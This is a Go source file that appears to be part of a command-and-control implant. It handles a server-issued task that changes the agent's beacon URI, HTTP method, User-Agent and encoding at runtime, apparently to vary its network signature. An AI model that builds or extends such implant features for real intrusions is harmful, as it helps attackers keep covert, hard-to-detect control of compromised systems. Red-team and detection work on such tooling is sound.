//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/json"
	"strings"
)

// ProfileRotation defines a new C2 profile to switch to at runtime.
// When an agent receives this task, it switches to the new beacon URI,
// HTTP method, User-Agent, and encoding format on the next beacon cycle.
type ProfileRotation struct {
	BeaconURI    string `json:"beacon_uri"`
	BeaconMethod string `json:"beacon_method"`
	UserAgent    string `json:"user_agent"`
	Encoding     string `json:"encoding"` // "json", "msgpack", "cbor"
}

var profileOverrides struct {
	beaconURI    string
	beaconMethod string
	userAgent    string
	encoding     string
}

func handleProfileRotate(task Task, res *TaskResult) {
	if task.Data == "" {
		res.Error = "profile_rotate: empty data"
		return
	}
	var pr ProfileRotation
	if err := json.Unmarshal([]byte(task.Data), &pr); err != nil {
		res.Error = "profile_rotate: invalid json: " + err.Error()
		return
	}
	if pr.BeaconURI != "" {
		profileOverrides.beaconURI = pr.BeaconURI
	}
	if pr.BeaconMethod != "" {
		profileOverrides.beaconMethod = strings.ToUpper(pr.BeaconMethod)
	}
	if pr.UserAgent != "" {
		profileOverrides.userAgent = pr.UserAgent
	}
	if pr.Encoding != "" {
		switch pr.Encoding {
		case "json", "msgpack", "cbor":
			profileOverrides.encoding = pr.Encoding
		}
	}
	res.Output = "profile rotated"
}

func getActiveBeaconURI() string {
	if profileOverrides.beaconURI != "" {
		return profileOverrides.beaconURI
	}
	return BeaconURI
}

func getActiveBeaconMethod() string {
	if profileOverrides.beaconMethod != "" {
		return profileOverrides.beaconMethod
	}
	return BeaconMethod
}

func getActiveUserAgent() string {
	if profileOverrides.userAgent != "" {
		return profileOverrides.userAgent
	}
	return UserAgent
}

func getActiveEncoding() string {
	return profileOverrides.encoding
}
